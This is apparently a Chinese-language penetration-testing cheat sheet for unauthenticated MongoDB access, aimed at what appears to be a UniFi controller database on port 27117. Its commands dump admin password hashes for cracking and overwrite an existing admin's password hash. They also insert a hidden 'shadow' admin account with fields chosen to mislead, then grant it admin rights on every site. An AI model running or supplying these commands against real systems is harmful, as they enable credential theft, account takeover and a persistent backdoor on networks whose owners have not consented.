# Interact
```bash
	## 安装MongoDB功能 ##
#获取下载资源包
curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz
#解压tar文件
tar xvf mongodb-linux-x86_64-3.4.7.tgz
#cd 到bin
cd mongodb-linux-x86_64-3.4.7/bin

#################################
#使用MongoDB

./mongo mongodb://{target_IP}:27017
>show dbs;
>use ${db};
>show collections;
>db.${collection}.find().pretty() #pretty()以好看的格式查看输出
```

## 搜集数据库中的root用户信息
在服务器里，无需认证便可利用mongDB：
1. 在DB中查找admin的密码hash，尝试破解他
2. 重置admin的密码
3. 创建一个隐形的admin账户

找寻admin的散列密码：
```bash
#使用该json用于转储admin密码
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
# ace是数据库名字， --eval 是对json求值
```
#Tips `$6$`是sha-512的开头
替换已有的admin账号密码：
```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
```
shadow admin:
首先创建一个密码，并加密成散列值，再把它塞到MongDB中
```bash
mkpasswd -m sha-512 <PASSWORD>
#替换其中的mail, name, x_shadow; time_created也可以改，但无必要，可用于迷惑
mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "time_created" : NumberLong(100019800), "x_shadow" : "<PASSWORD-HASH>" })'

#看一下装进去没有，并且保留ObjectID条目，之后会用上（中间的ID部分）
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

```bash
#查找站点，并把新建立的admin插入进去，（ID用的上了）
mongo --port 27117 ace --eval "db.site.find().forEach(printjson);"

mongo --port 27117 ace --eval 'db.privilege.insert({ "admin_id" : "{admin_objectID}", "permissions" : [ ], "role" : "admin", "site_id" : "{Site_objectID}" });'
# 重复这条命令，添加到别的site中


